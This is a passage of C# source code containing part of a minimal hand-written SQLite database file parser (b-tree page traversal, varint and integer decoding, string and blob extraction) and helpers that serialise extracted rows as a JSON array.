                else if (pt == 5)
                {
                    for(int i=0;i<cnt;i++){int p=(int)Uint(_db,(int)off+12+i*2,2);if(off!=100)p+=(int)off;ReadLeaves((Uint(_db,p,4)-1)*_pageSize,rows,blobs);}
                    ReadLeaves((Uint(_db,(int)off+8,4)-1)*_pageSize,rows,blobs);
                }
            }

            long   Sz(long sr) { if(sr<=9) return sr<_typeSz.Length?_typeSz[sr]:0; return sr%2==1?(sr-13)/2:(sr-12)/2; }
            string Str(int off,int len) { if(off<0||len<=0||off+len>_db.Length) return ""; switch(_enc){case 2:return Encoding.Unicode.GetString(_db,off,len);case 3:return Encoding.BigEndianUnicode.GetString(_db,off,len);default:return Encoding.UTF8.GetString(_db,off,len);} }
            byte[] Raw(int off,int len) { if(off<0||len<=0||off+len>_db.Length) return new byte[0]; byte[] b=new byte[len]; Buffer.BlockCopy(_db,off,b,0,len); return b; }
            static ulong Uint(byte[] db,int s,int n) { if(n<=0||n>8||s<0||s+n>db.Length) return 0; ulong v=0; for(int i=0;i<n;i++) v=(v<<8)|db[s+i]; return v; }
            int GVL(int s) { int e=Math.Min(s+8,_db.Length-1); for(int i=s;i<=e;i++) if((_db[i]&0x80)==0) return i; return e; }
            long CVL(int s,int e) { e++;int len=e-s; if(len==0||len>9) return 0; if(len==1) return _db[s]&0x7F; byte[] buf=new byte[8]; bool n9=len==9; int idx=0; if(n9){buf[0]=_db[e-1];e--;idx=1;} int b=1; for(int i=e-1;i>=s;i--){if(i-1>=s)buf[idx++]=(byte)((_db[i]>>((b-1)&7))&(0xFF>>b)|(_db[i-1]<<((8-b)&7)));else if(!n9)buf[idx]=(byte)((_db[i]>>((b-1)&7))&(0xFF>>b));b++;} return BitConverter.ToInt64(buf,0); }
        }

        // ── JSON ──────────────────────────────────────────────────────────────────

        private static string JStr(string s)
        {
            if (s == null) return "\"\"";
            return "\"" + s.Replace("\\","\\\\").Replace("\"","\\\"").Replace("\r","\\r").Replace("\n","\\n").Replace("\t","\\t") + "\"";
        }

        private static string BuildJsonArray(List<string[]> rows, string[] keys)
        {
            var sb = new StringBuilder("[");
            for (int r = 0; r < rows.Count; r++)
            {
                if (r > 0) sb.Append(',');
                sb.Append('{');
                for (int k = 0; k < keys.Length; k++)
                {
                    if (k > 0) sb.Append(',');
                    sb.Append('"').Append(keys[k]).Append("\":");
                    sb.Append(JStr(k < rows[r].Length ? rows[r][k] : null));
                }
                sb.Append('}');
            }
            sb.Append(']');
            return sb.ToString();
        }
    }
}
